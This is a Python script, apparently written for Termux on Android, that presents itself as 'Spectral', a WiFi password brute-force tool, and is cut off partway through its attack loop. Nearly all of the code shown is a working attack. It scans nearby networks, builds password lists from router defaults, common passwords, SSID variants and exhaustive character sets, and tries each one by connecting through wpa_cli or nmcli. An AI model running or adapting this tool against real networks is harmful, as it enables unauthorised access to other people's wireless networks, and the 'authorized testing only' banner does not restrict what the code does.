#!/data/data/com.termux/files/usr/bin/python3
"""
Spectral - WiFi Password Brute Force Tool (Generative Engine)
Authorized Penetration Testing Only
"""

import subprocess
import sys
import os
import re
import time
import json
import signal
import itertools
import string
import math
import threading
from typing import Generator, List, Optional, Tuple
from datetime import datetime

# =============== CONFIG ===============
VERSION = "1.0"
AUTHOR = "Spectral"
BANNER = f"""
{'\033[96m'}{'='*60}
   ███████  ██████  ███████  ██████  ████████ ██████   █████  ██      
   ██      ██      ██      ██         ██    ██   ██ ██   ██ ██      
   ███████ ██      █████   ██         ██    ██████  ███████ ██      
        ██ ██      ██      ██         ██    ██   ██ ██   ██ ██      
   ███████  ██████  ███████  ██████    ██    ██   ██ ██   ██ ███████ 
{'='*60}
        WiFi Brute Force Engine v{VERSION}
     Authorized Security Testing Tool
{'='*60}{'\033[0m'}
"""

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BLUE = '\033[94m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

stop_attack = False
password_found = None
found_event = threading.Event()


# =============== SIGNAL HANDLING ===============

def signal_handler(sig, frame):
    global stop_attack
    print(f"\n{YELLOW}[!] Interrupted. Returning to menu...{RESET}")
    stop_attack = True
    found_event.set()


signal.signal(signal.SIGINT, signal_handler)


# =============== UTILITIES ===============

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def check_root():
    result = subprocess.run(['id', '-u'], capture_output=True, text=True)
    return result.stdout.strip() == '0'


def human_readable_count(n: int) -> str:
    if n < 1000: return str(n)
    elif n < 1_000_000: return f"{n/1000:.1f}K"
    elif n < 1_000_000_000: return f"{n/1_000_000:.1f}M"
    elif n < 1_000_000_000_000: return f"{n/1_000_000_000:.1f}B"
    else: return f"{n/1_000_000_000_000:.1f}T"


def human_time(seconds: float) -> str:
    if seconds < 60: return f"{seconds:.0f}s"
    elif seconds < 3600: return f"{seconds/60:.1f}m"
    elif seconds < 86400: return f"{seconds/3600:.1f}h"
    else: return f"{seconds/86400:.1f}d"


# =============== NETWORK SCANNING ===============

def scan_networks() -> List[dict]:
    """Scan for nearby WiFi networks."""
    print(f"{CYAN}[*] Scanning for WiFi networks...{RESET}")
    
    networks = []
    
    try:
        result = subprocess.run(
            ['termux-wifi-scaninfo'],
            capture_output=True, text=True, timeout=20
        )
        
        if result.returncode == 0 and result.stdout.strip():
            data = json.loads(result.stdout)
            seen = set()
            for net in data:
                ssid = net.get('ssid', '').strip()
                if not ssid or ssid in seen:
                    continue
                seen.add(ssid)
                
                bssid = net.get('bssid', 'N/A')
                rssi = net.get('rssi', net.get('signal_level', 0))
                freq = net.get('frequency', net.get('center_freq0', 0))
                channel = net.get('channel', '?')
                capabilities = net.get('capabilities', 'Unknown')
                
                # Determine encryption type
                enc = 'WPA2'
                if 'WPA3' in capabilities:
                    enc = 'WPA3'
                elif 'WPA2' in capabilities:
                    enc = 'WPA2'
                elif 'WPA' in capabilities:
                    enc = 'WPA'
                elif 'WEP' in capabilities:
                    enc = 'WEP'
                else:
                    enc = 'Open'
                
                # Signal bars
                if isinstance(rssi, (int, float)):
                    if rssi > -50: bars = '████'
                    elif rssi > -60: bars = '███░'
                    elif rssi > -70: bars = '██░░'
                    elif rssi > -80: bars = '█░░░'
                    else: bars = '░░░░'
                else:
                    bars = '????'
                
                networks.append({
                    'ssid': ssid,
                    'bssid': bssid,
                    'rssi': rssi,
                    'bars': bars,
                    'channel': channel,
                    'encryption': enc,
                    'capabilities': capabilities
                })
            
            # Sort by signal strength (strongest first)
            networks.sort(key=lambda x: x['rssi'] if isinstance(x['rssi'], (int, float)) else -100, reverse=True)
    except FileNotFoundError:
        print(f"{RED}[!] termux-wifi-scaninfo not found. Install: pkg install termux-api{RESET}")
    except json.JSONDecodeError:
        print(f"{RED}[!] Failed to parse scan results.{RESET}")
    except subprocess.TimeoutExpired:
        print(f"{RED}[!] Scan timed out.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Scan error: {e}{RESET}")
    
    # Also try iwlist if available
    if not networks:
        try:
            result = subprocess.run(
                ['iwlist', 'scan'],
                capture_output=True, text=True, timeout=15
            )
            if result.returncode == 0:
                cells = re.split(r'Cell \d+ -', result.stdout)
                for cell in cells[1:]:
                    ssid_match = re.search(r'ESSID:"([^"]*)"', cell)
                    if ssid_match:
                        ssid = ssid_match.group(1)
                        if not ssid:
                            continue
                        bssid_match = re.search(r'Address: ([0-9A-Fa-f:]+)', cell)
                        bssid = bssid_match.group(1) if bssid_match else 'N/A'
                        signal_match = re.search(r'Signal level=(-?\d+)', cell)
                        rssi = int(signal_match.group(1)) if signal_match else 0
                        enc_match = re.search(r'Encryption key:(on|off)', cell)
                        enc = 'WPA' if enc_match and enc_match.group(1) == 'on' else 'Open'
                        
                        bars = '████'
                        if rssi < -80: bars = '░░░░'
                        elif rssi < -70: bars = '█░░░'
                        elif rssi < -60: bars = '██░░'
                        elif rssi < -50: bars = '███░'
                        
                        networks.append({
                            'ssid': ssid,
                            'bssid': bssid,
                            'rssi': rssi,
                            'bars': bars,
                            'channel': '?',
                            'encryption': enc,
                            'capabilities': enc
                        })
        except:
            pass
    
    return networks


def display_networks(networks: List[dict]):
    """Display scanned networks in a formatted table."""
    if not networks:
        print(f"{RED}[!] No networks found.{RESET}")
        return
    
    print(f"\n{BOLD}{'SSID':<32} {'BSSID':<18} {'SIG':<6} {'CH':<4} {'ENC':<6}{RESET}")
    print(f"{DIM}{'-'*70}{RESET}")
    
    for i, net in enumerate(networks, 1):
        ssid = net['ssid'][:30] if len(net['ssid']) > 30 else net['ssid']
        bars = net['bars']
        enc = net['encryption']
        
        # Color by signal
        rssi = net['rssi'] if isinstance(net['rssi'], (int, float)) else -100
        if rssi > -60:
            sig_color = GREEN
        elif rssi > -75:
            sig_color = YELLOW
        else:
            sig_color = RED
        
        print(f"{i:2}. {CYAN}{ssid:<30}{RESET} "
              f"{DIM}{net['bssid']:<18}{RESET} "
              f"{sig_color}{bars}{RESET} "
              f"{net['channel']:<4} "
              f"{MAGENTA}{enc:<6}{RESET}")


# =============== WIFI CONNECTION ===============

def try_wifi_password(ssid: str, password: str) -> bool:
    """Attempt to connect to WiFi with given password."""
    
    # Method 1: wpa_cli (root)
    try:
        add_result = subprocess.run(
            ['wpa_cli', 'add_network'],
            capture_output=True, text=True, timeout=5
        )
        if add_result.returncode == 0:
            net_id = add_result.stdout.strip()
            if net_id and net_id.isdigit():
                subprocess.run(['wpa_cli', 'set_network', net_id, 'ssid', f'"{ssid}"'],
                              capture_output=True, timeout=3)
                subprocess.run(['wpa_cli', 'set_network', net_id, 'psk', f'"{password}"'],
                              capture_output=True, timeout=3)
                subprocess.run(['wpa_cli', 'enable_network', net_id],
                              capture_output=True, timeout=3)
                subprocess.run(['wpa_cli', 'select_network', net_id],
                              capture_output=True, timeout=3)
                time.sleep(1.5)
                status = subprocess.run(['wpa_cli', 'status'],
                                      capture_output=True, text=True, timeout=3)
                subprocess.run(['wpa_cli', 'remove_network', net_id],
                              capture_output=True, timeout=2)
                
                if 'wpa_state=COMPLETED' in status.stdout:
                    # Verify we're connected to THIS network
                    if ssid in status.stdout:
                        return True
    except:
        pass

    # Method 2: nmcli
    try:
        subprocess.run(
            ['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password],
            capture_output=True, timeout=8
        )
        result = subprocess.run(
            ['nmcli', '-t', '-f', 'ACTIVE,SSID', 'device', 'wifi'],
            capture_output=True, text=True, timeout=3
        )
        if f'yes:{ssid}' in result.stdout:
            return True
    except:
        pass

    return False


def disconnect_wifi():
    """Disconnect from current WiFi."""
    try:
        subprocess.run(['wpa_cli', 'remove_network', 'all'],
                      capture_output=True, timeout=3)
    except:
        pass
    try:
        subprocess.run(['nmcli', 'device', 'disconnect', 'wlan0'],
                      capture_output=True, timeout=3)
    except:
        pass


# =============== PASSWORD GENERATORS ===============

def generate_numeric(length: int) -> Generator[str, None, None]:
    for combo in itertools.product(string.digits, repeat=length):
        yield ''.join(combo)


def generate_lowercase(length: int) -> Generator[str, None, None]:
    for combo in itertools.product(string.ascii_lowercase, repeat=length):
        yield ''.join(combo)


def generate_alphanumeric(length: int) -> Generator[str, None, None]:
    chars = string.ascii_lowercase + string.digits
    for combo in itertools.product(chars, repeat=length):
        yield ''.join(combo)


def generate_mixedcase_alphanumeric(length: int) -> Generator[str, None, None]:
    chars = string.ascii_letters + string.digits
    for combo in itertools.product(chars, repeat=length):
        yield ''.join(combo)


def generate_common_patterns(ssid: str = '') -> Generator[str, None, None]:
    # Common base passwords
    common = [
        'admin', 'password', '12345678', '123456789', '1234567890',
        'qwerty123', 'qwerty1', '11111111', '00000000', 'admin123',
        'letmein', 'welcome1', 'P@ssw0rd', 'passw0rd', 'changeme',
        'default', 'guest', 'root', 'user', 'test1234', 'pass1234',
        # Router defaults
        'admin', 'password', '1234', '12345', '123456', '0000',
        'linksys', 'netgear', 'dlink', 'tp-link', 'asus', 'belkin',
        'wireless', 'home', 'family', 'default', 'motorola',
    ]
    yield from common
    
    # Common suffixes on bases
    bases = ['admin', 'pass', 'wifi', 'home', 'net', 'user', 'root', 'test', 'guest']
    for base in bases:
        for suffix in ['123', '1234', '12345', '1', '!', '@', '69', '007']:
            yield f"{base}{suffix}"
            yield f"{base.capitalize()}{suffix}"
    
    # Years
    for year in range(2000, 2030):
        yield str(year)
        for word in ['admin', 'pass', 'wifi', 'home']:
            yield f"{word}{year}"
    
    # Keyboard walks
    kb_patterns = [
        'qwerty', 'qwertyuiop', 'qwerty123', 'asdfgh', 'asdfghjkl',
        'zxcvbn', '1q2w3e4r', '1qaz2wsx', 'qwerty12345',
        'qwe123', 'asd123', 'zxc123', '1q2w3e4r5t',
    ]
    yield from kb_patterns
    
    # SSID-based patterns
    if ssid:
        yield ssid
        yield ssid.lower()
        yield ssid.upper()
        yield ssid + '123'
        yield ssid + '1234'
        yield ssid + '1'
        yield ssid + '!'
        
        ssid_lower = ssid.lower()
        if 'linksys' in ssid_lower:
            yield 'admin'
        if 'netgear' in ssid_lower:
            yield 'password'
            yield '1234'
        if 'tplink' in ssid_lower or 'tp-link' in ssid_lower:
            yield 'admin'
        if 'dlink' in ssid_lower or 'd-link' in ssid_lower:
            yield 'admin'
            yield '1234'


def password_generator(mode: str, min_len: int, max_len: int, ssid: str = '') -> Generator[str, None, None]:
    """
    Master generator that produces passwords based on attack mode.
    
    Modes:
      quick     - Common patterns + short numeric (fast coverage)
      smart     - Common + numeric (1-10) + short alpha (recommended)
      aggressive- Everything up to 8 chars mixed
      numeric   - Numbers only
      lowercase - Lowercase letters only
      alphanum  - Lowercase + digits (no symbols)
      full      - Everything (trillions)
    """
    tried = set()
    
    def dedup(gen):
        for pwd in gen:
            if pwd not in tried and min_len <= len(pwd) <= max_len:
                tried.add(pwd)
                yield pwd
    
    # Phase 0: Common patterns (always)
    yield from dedup(generate_common_patterns(ssid))
    
    if mode == 'quick':
        # Short numeric
        for length in range(4, min(max_len + 1, 7)):
            yield from dedup(generate_numeric(length))
        return
    
    # Phase 1: Numeric
    if mode in ['smart', 'aggressive', 'numeric', 'alphanum', 'full']:
        print(f"\n{CYAN}[*] Phase 1: Numeric ({min_len}-{min(max_len, 10)} digits)...{RESET}")
        for length in range(min_len, min(max_len + 1, 11)):
            yield from dedup(generate_numeric(length))
    
    if mode == 'numeric':
        return
    
    # Phase 2: Lowercase short
    if mode in ['smart', 'aggressive', 'lowercase', 'alphanum', 'full']:
        print(f"\n{CYAN}[*] Phase 2: Lowercase (len 4-6)...{RESET}")
        for length in range(4, min(max_len + 1, 7)):
            yield from dedup(generate_lowercase(length))
    
    if mode == 'lowercase':
        return
    
    # Phase 3: Alphanumeric short-medium
    if mode in ['smart', 'aggressive', 'alphanum', 'full']:
        print(f"\n{CYAN}[*] Phase 3: Alphanumeric (len 4-7)...{RESET}")
        for length in range(4, min(max_len + 1, 8)):
            yield from dedup(generate_alphanumeric(length))
    
    if mode in ['smart', 'alphanum']:
        return
    
    # Phase 4: Longer numeric
    if mode in ['aggressive', 'full']:
        print(f"\n{CYAN}[*] Phase 4: Long numeric (10-{max_len})...{RESET}")
        for length in range(10, min(max_len + 1, 13)):
            yield from dedup(generate_numeric(length))
    
    # Phase 5: Mixed case alphanumeric
    if mode in ['aggressive', 'full']:
        print(f"\n{CYAN}[*] Phase 5: Mixed-case alphanumeric (len 4-7)...{RESET}")
        for length in range(4, min(max_len + 1, 8)):
            yield from dedup(generate_mixedcase_alphanumeric(length))


def estimate_search_space(mode: str, min_len: int, max_len: int) -> int:
    """Estimate total passwords a mode will generate."""
    total = 500  # common patterns
    
    if mode == 'quick':
        for l in range(4, min(max_len + 1, 7)):
            total += 10 ** l
        return total
    
    # Numeric
    for l in range(min_len, min(max_len + 1, 11)):
        total += 10 ** l
    
    if mode == 'numeric':
        return total
    
    # Lowercase
    for l in range(4, min(max_len + 1, 7)):
        total += 26 ** l
    
    if mode == 'lowercase':
        return total
    
    # Alphanumeric
    for l in range(4, min(max_len + 1, 8)):
        total += 36 ** l
    
    if mode in ['smart', 'alphanum']:
        return total
    
    # Aggressive extras
    if mode in ['aggressive', 'full']:
        for l in range(10, min(max_len + 1, 13)):
            total += 10 ** l
        for l in range(4, min(max_len + 1, 8)):
            total += 62 ** l
    
    return total


# =============== BRUTE FORCE ENGINE ===============

def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
    """Main brute force loop using generated passwords."""
    global stop_attack, password_found
    
    stop_attack = False
    found_event.clear()
    password_found = None
    
    estimated = estimate_search_space(mode, min_len, max_len)
    
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  ATTACK STARTED{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"  {YELLOW}SSID:{RESET}          {ssid}")
    print(f"  {YELLOW}Mode:{RESET}          {mode}")
    print(f"  {YELLOW}Length range:{RESET}  {min_len}-{max_len}")
    print(f"  {YELLOW}Search space:{RESET}  ~{human_readable_count(estimated)} passwords")
    print(f"  {YELLOW}Delay:{RESET}         {delay}s")
    
    if estimated > 100_000_000:
        print(f"\n{RED}[!] WARNING: Large search space. This could take very long.{RESET}")
        confirm = input(f"{CYAN}[?] Continue? (y/N): {RESET}")
        if confirm.lower() != 'y':
            print(f"{YELLOW}[!] Attack cancelled.{RESET}")
            return
    
    start_time = time.time()
    attempts = 0
    found = False
    
    # Progress tracking
    progress_file = f".spectral_progress_{ssid.replace(' ', '_')}.txt"
    last_save = 0
    
    generator = password_generator(mode, min_len, max_len, ssid)
    
    print(f"\n{GREEN}[*] Attack running... (Ctrl+C to return to menu){RESET}\n")
    
    for password in generator:
        if stop_attack or found_event.is_set():
            break
        
        attempts += 1
        
        # Display progress
        if attempts % 3 == 0 or attempts == 1:
            elapsed = time.time() - start_time
            rate = attempts / elapsed if elapsed > 0 else 0
            pct = (attempts / estimated * 100) if estimated > 0 else 0
            
            remaining = (estimated - attempts) / rate if rate > 0 else 0
            
            print(f"\r{YELLOW}[{attempts:>12,}] {RESET}"
                  f"{CYAN}{password:<25}{RESET} "
                  f"{GREEN}{pct:.4f}%{RESET} "
                  f"{DIM}{rate:.1f}/s{RESET} "
                  f"{MAGENTA}ETA: {human_time(remaining)}{RESET}  ", end='', flush=True)
        
        # Periodic save
        if attempts - last_save >= 100000:
            last_save = attempts
            try:
                with open(
